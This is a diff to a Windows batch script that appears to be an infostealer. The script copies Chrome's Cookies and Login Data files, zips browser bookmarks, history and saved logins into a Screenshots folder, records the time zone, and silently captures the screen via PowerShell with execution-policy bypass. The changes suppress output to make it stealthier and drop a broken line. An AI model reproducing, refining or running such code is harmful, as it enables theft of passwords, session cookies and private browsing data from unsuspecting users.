@@ -21,9 +21,9 @@ copy "%chrome_data_path%\Default\Cookies" "%output_dir%\Cookies" >nul
 copy "%chrome_data_path%\Default\Login Data" "%output_dir%\Login Data" >nul
 cls
 
-powershell -command "Compress-Archive -Path '%output_dir%\Bookmarks' -DestinationPath '%output_dir%\Bookmarks.zip'"
-powershell -command "Compress-Archive -Path '%output_dir%\History' -DestinationPath '%output_dir%\History.zip'"
-powershell -command "Compress-Archive -Path '%output_dir%\Login Data' -DestinationPath '%output_dir%\Login_Data.zip'"
+powershell -command "Compress-Archive -Path '%output_dir%\Bookmarks' -DestinationPath '%output_dir%\Bookmarks.zip' | Out-Null"
+powershell -command "Compress-Archive -Path '%output_dir%\History' -DestinationPath '%output_dir%\History.zip' | Out-Null"
+powershell -command "Compress-Archive -Path '%output_dir%\Login Data' -DestinationPath '%output_dir%\Login_Data.zip' | Out-Null"
 cls
 
 set "file1=%localappdata%\Screenshots\Bookmarks.zip"
@@ -81,8 +81,6 @@ cls
 
 for /f "tokens=* delims=" %%t in ('tzutil /g') do (set "timezone=%%t")
 cls
-
-for /f "tokens=* delims=" %%m in ('%USERNAME%') do (set "pcname=%%m")
 
 set "screenshotFile=%screenshotDir%\screenshot.png"
 powershell -NoProfile -ExecutionPolicy Bypass -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $Bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height; $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap); $Graphics.CopyFromScreen(0, 0, 0, 0, $Screen.Size); $Bitmap.Save('%screenshotFile%', [System.Drawing.Imaging.ImageFormat]::Png); $Graphics.Dispose(); $Bitmap.Dispose();"
